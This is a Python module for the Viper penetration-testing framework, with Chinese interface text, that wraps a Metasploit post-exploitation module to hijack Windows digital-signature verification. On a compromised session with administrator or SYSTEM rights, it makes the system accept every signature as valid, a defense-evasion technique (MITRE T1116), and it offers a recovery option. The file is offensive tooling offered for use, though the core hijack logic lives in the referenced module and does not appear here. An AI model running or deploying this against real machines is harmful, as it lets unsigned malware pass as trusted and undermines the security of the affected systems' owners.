# -*- coding: utf-8 -*-
# @File  : SimplePostPythonModule.py
# @Date  : 2019/1/12
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME = "劫持Windows数字签名认证"
    DESC = "修改Windows默认数字证书认证文件,使系统默认认证所有数字签名有效.\n" \
           "模块会影响系统所有exe的运行签名认证,请谨慎使用."
    MODULETYPE = TAG2CH.Defense_Evasion
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1116"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/muinbs"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1116/"]
    AUTHOR = "Viper"

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionEnum(name='action',
                   name_tag="操作",
                   desc="Hijack表示劫持数字签名DLL,Recovery表示恢复系统默认数字证书DLL",
                   required=True,
                   default="Hijack",
                   enum_list=[
                       {'name': "劫持", 'value': "Hijack"},
                       {'name': "恢复", 'value': "Recovery"},
                   ]),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "windows/manage/pe_signing_auth_hijack"

    def check(self):
        """执行前的检查函数"""
        action = self.param("action")
        session = Session(self._sessionid)
        if session.is_alive:
            pass
        else:
            return False, "Session不可用"
        if session.is_admin:
            pass
        else:
            return False, "模块需要系统管理员权限"

        self.set_option("Action", action)
        return True, None

    def callback(self, status, message, data):
        if status:
            self.log_good("模块执行成功")
            self.log_good("运行模式: {}".format(data))
        else:
            self.log_error("模块执行失败")
            self.log_error("运行模式: {}".format(data))
